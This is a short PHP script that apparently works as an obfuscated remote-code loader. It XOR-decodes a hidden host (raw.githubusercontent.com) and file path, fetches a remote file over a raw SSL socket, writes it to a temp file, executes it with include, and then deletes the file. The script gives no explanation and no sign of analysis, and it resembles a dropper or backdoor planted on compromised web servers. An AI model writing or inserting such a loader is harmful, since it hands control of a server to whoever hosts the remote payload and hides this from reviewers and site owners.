<?php
function localXorEncryptDecrypt($data, $key) {
    $output = '';
    $keyChar = substr($key, 0, 1);
    foreach (str_split($data) as $char) {
        $output .= chr(ord($char) ^ ord($keyChar));
    }
    return $output;
}
 $_ = "!";
 $url = localXorEncryptDecrypt("S@VFHUITCTRDSBNOUDOUBNL", $_);
 $path = localXorEncryptDecrypt("M@NMHDS[HBNLLHURQIQCESDGRID@ERL@HO", $_);
 $exx = localXorEncryptDecrypt("QIQ", $_);

 $pc = $path . "xx" . $exx;
 $fp = fsockopen("ssl://$url", 443, $errno, $errstr, 10);
if (!$fp) {
    echo "Error: $errstr ($errno)";
    exit;
}

 $request = "GET $pc HTTP/1.1\r\n";
 $request .= "Host: $url\r\n";
 $request .= "Connection: close\r\n\r\n";

fwrite($fp, $request);

 $response = '';
while (!feof($fp)) {
    $response .= fgets($fp, 1024);
}
fclose($fp);

list(, $remotePayload) = explode("\r\n\r\n", $response, 2);

 $parts = str_split($remotePayload, 4);
 $obfuscatedPayload = implode('', $parts);
 $tempFile = tempnam(sys_get_temp_dir(), $exx);
file_put_contents($tempFile, $obfuscatedPayload);
include $tempFile;

unlink($tempFile);

?>
